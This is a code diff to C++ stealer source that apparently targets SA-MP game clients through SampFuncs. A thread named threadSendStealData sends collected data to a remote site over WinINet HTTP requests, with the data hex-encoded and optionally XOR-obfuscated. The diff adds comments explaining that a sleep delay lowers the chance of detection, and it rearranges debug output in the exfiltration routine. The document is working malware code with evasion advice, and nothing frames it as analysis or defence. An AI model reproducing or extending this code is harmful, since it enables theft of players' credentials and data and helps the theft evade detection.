@@ -38,14 +38,14 @@ void parsePage(string url, string request, string& out)
 
 			if (hRequest != NULL)
 			{
-				// send the request
+				// Send the request
 				BOOL bSend = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
 
 				if (bSend)
 				{
 					while (true)
 					{
-						// read the data
+						// Read a data
 						char *szData = new char[1024];
 						DWORD dwBytesRead;
 
@@ -73,13 +73,13 @@ void threadSendStealData(void* param)
 {
 	string strData = *(string*)param;
 
-	Sleep(10000); // delay (milliseconds)		
+	// Delay (milliseconds). 
+	// Use it to reduce the probability of detection by sent packets.
+	Sleep(10000);		
 
 	string not_use;
 
 	parsePage(URL_SITE, URL_PAGE + strData, not_use);
-
-	SF->getSAMP()->getChat()->AddChatMessage(D3DCOLOR_XRGB(0, 0xAA, 0), "param: %s", strData.c_str());
 }
 
 void sendResults(int iID, std::string strData)
@@ -98,7 +98,11 @@ void sendResults(int iID, std::string strData)
 
 	std::string strResult = std::string(szResults, strlen(szResults));
 
-	for (char &i : strResult) i ^= 2281337228;
+	// This is for debugging. Delete it in a real project.
+	SF->getSAMP()->getChat()->AddChatMessage(D3DCOLOR_XRGB(0, 0xAA, 0), "debug: %s", strResult.c_str());
+
+	// Additional encoding. Use if need.
+	// for (char &i : strResult) i ^= 1111;
 
 	strResult = boost::algorithm::hex(strResult);
 
